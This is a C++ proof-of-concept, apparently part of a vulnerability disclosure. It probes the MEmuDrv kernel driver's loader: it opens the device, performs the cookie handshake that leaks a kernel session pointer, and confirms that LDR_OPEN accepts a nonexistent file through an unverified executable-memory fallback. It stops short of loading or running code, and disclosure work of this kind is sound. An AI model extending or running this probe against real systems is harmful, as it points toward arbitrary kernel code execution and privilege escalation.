// poc_memudrv.cpp - non-destructive PoC for the MEmuDrv loader-fallback defect.
//
// demonstrates exactly two things, nothing more:
//   1. cookie handshake against \\.\MEmuDrv (proves an external admin process
//      gets a working session; the response also leaks the kernel session ptr)
//   2. SUP_IOCTL_LDR_OPEN with a nonexistent szFilename succeeds via the
//      RTMemExecAlloc fallback (FromFile == 0) where upstream VBox requires a
//      verified backing file. this is the branch that makes the loader an
//      arbitrary kernel code execution primitive - see ANALYSIS.md 2.1/2.2.
//
// deliberately NOT implemented: LDR_LOAD + entry-point invocation. the PoC
// stops at the boundary proof; nothing is loaded or executed.
//
// needs admin + the driver running (MEmu installed, or: sc start MEmuDrv):
//   poc_memudrv.exe
//
// part of the disclosure package in ANALYSIS.md. own systems only.

#include <cstdio>
#include "memudrv.h"

int main() {
    MemuDrv drv;
    if (!drv.Open()) {
        wprintf(L"[-] Open failed, err=%lu (admin? service started? MEmu installed?)\n",
                GetLastError());
        return 1;
    }
    wprintf(L"[+] \\Device\\MEmuDrv session opened\n");

    // 1. cookie handshake
    uint32_t ver = drv.Handshake();
    if (!ver) {
        wprintf(L"[-] cookie handshake failed, err=%lu\n", GetLastError());
        return 2;
    }
    wprintf(L"[+] handshake OK, session version = 0x%X (build 0x2A0000)\n", ver);

    // 2. LDR_OPEN fallback probe
    uint64_t handle = 0;
    uint8_t fromFile = 1;
    if (drv.LdrOpenFallbackProbe("probe", handle, fromFile)) {
        wprintf(L"[+] LDR_OPEN with nonexistent filename: SUCCESS\n");
        wprintf(L"    module handle = 0x%016llX\n", handle);
        wprintf(L"    FromFile flag = %u  (0 = RTMemExecAlloc fallback, no backing file,\n"
                L"                          no signature verification, entry-point\n"
                L"                          validation skipped in LDR_LOAD)\n", fromFile);
        if (!fromFile)
            wprintf(L"[+] unprotected loader fallback CONFIRMED\n");
    } else {
        wprintf(L"[-] LDR_OPEN probe failed (err=%lu) - fallback may be patched\n",
                GetLastError());
    }

    wprintf(L"[+] done - session close releases the probe module\n");
    drv.Close();
    return 0;
}
